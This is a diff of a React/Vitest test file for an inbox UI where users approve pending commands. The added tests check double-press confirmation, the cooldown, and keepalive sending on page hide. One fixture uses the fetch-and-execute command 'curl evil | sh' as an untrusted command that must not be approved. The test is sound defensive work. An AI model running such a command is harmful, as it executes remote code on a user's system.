@@ -6,6 +6,7 @@ import { act, fireEvent, screen, waitFor, within } from '@testing-library/react'
 import userEvent from '@testing-library/user-event';
 import { describe, expect, it, vi } from 'vitest';
 import { ApprovalCard, approvalTiming, toast } from '@ui';
+import type { InboxAnswer } from '../api/gen/InboxAnswer';
 import type { InboxItem } from '../api/gen/InboxItem';
 import { answerTiming, guardedAnswer } from '../common/answerGuard';
 import { renderWithQuery, stubApi, type Call } from '../test-utils';
@@ -13,6 +14,7 @@ import { holdAnswer, holdTiming, useHeldIds } from './held';
 import { InboxList } from './InboxList';
 import { InboxView } from './InboxView';
 import { needsConfirm, recommendationTone } from './model';
+import { useAnswer } from './useAnswer';
 import { useInbox } from './useInbox';
 
 const item = (id: string, over: Partial<InboxItem> = {}): InboxItem => ({
@@ -126,6 +128,35 @@ describe('answers that act outside PDT ask for a second press', () => {
     expect(answers(calls)).toEqual([]);
     await userEvent.click(screen.getByRole('button', { name: 'Confirm request changes' }));
     await waitFor(() => expect(answers(calls).map((c) => c.body)).toEqual([{ choice: 'request_changes' }]));
+  });
+
+  it('never approves a waiting command on Enter, and asks twice, showing the command (PDT-705)', async () => {
+    answerTiming.cooldownMs = 300;
+    const notice = (id: string, fingerprint: string, command: string) => item(id, {
+      kind: 'notice', group: 'notice', stepId: null, ticketId: null, title: `A command waits on your approval ${id}`, choices: [],
+      body: { notice: null, key: 'untrusted-commands', fingerprint, command: { fingerprint, uses: ['run "web"'], setup: null, command, env: {} } },
+    });
+    const calls = stubApi({ 'POST /api/projects/p/commands/trust': undefined, 'GET /api/inbox': { items: [], total: 0 } });
+    const trusted = () => calls.filter((c) => c.path === '/api/projects/p/commands/trust').map((c) => c.body);
+    renderWithQuery(<Inbox items={[notice('a', 'fp-a', 'make web'), notice('b', 'fp-b', 'curl evil | sh')]} />);
+    expect(needsConfirm(notice('a', 'fp-a', 'make web'), 'approve')).toBe(true);
+    fireEvent.keyDown(window, { key: 'Enter' });
+    fireEvent.keyDown(window, { key: 'Enter' });
+    expect(screen.queryByRole('button', { name: 'Confirm approve' })).not.toBeInTheDocument();
+    // A double-click arms it and does nothing more; the hint names the command.
+    fireEvent.click(screen.getByRole('button', { name: 'Approve' }));
+    fireEvent.click(screen.getByRole('button', { name: 'Confirm approve' }));
+    expect(screen.getByText(/Press again to approve/)).toHaveTextContent('make web');
+    await new Promise((r) => setTimeout(r, 350));
+    await userEvent.click(screen.getByRole('button', { name: 'Confirm approve' }));
+    await waitFor(() => expect(trusted()).toEqual([{ fingerprints: ['fp-a'] }]));
+    // The next notice slid into place unarmed: a press only arms it.
+    expect(screen.getByRole('heading', { name: 'A command waits on your approval b' })).toBeInTheDocument();
+    await new Promise((r) => setTimeout(r, 350));
+    fireEvent.click(screen.getByRole('button', { name: 'Approve' }));
+    fireEvent.keyDown(window, { key: 'Enter' });
+    await new Promise((r) => setTimeout(r, 50));
+    expect(trusted()).toEqual([{ fingerprints: ['fp-a'] }]);
   });
 
   it('asks again for y on an Allow that posts outside PDT', async () => {
@@ -254,6 +285,23 @@ describe('Undo', () => {
     expect(await screen.findByText('b of 1')).toBeInTheDocument();
     await act(async () => fail());
     expect(await screen.findByText('a,b of 2')).toBeInTheDocument();
+  });
+
+  it('sends held answers at once, with keepalive, when the page goes away', async () => {
+    const a = item('a');
+    const calls = stubApi({ 'POST /api/inbox/a/answer': {} });
+    holdTiming.undoMs = 60_000;
+    function Answer() {
+      const { answer } = useAnswer(a, () => {});
+      return <button onClick={() => void answer({ choice: 'ship' } satisfies InboxAnswer)}>Ship</button>;
+    }
+    renderWithQuery(<Answer />);
+    await userEvent.click(screen.getByRole('button', { name: 'Ship' }));
+    expect(calls.some((c) => c.path === '/api/inbox/a/answer')).toBe(false);
+    act(() => window.dispatchEvent(new Event('pagehide')));
+    await waitFor(() => expect(calls.some((c) => c.path === '/api/inbox/a/answer')).toBe(true));
+    const init = vi.mocked(fetch).mock.calls.find(([path]) => path === '/api/inbox/a/answer')?.[1];
+    expect(init?.keepalive).toBe(true);
   });
 });
 
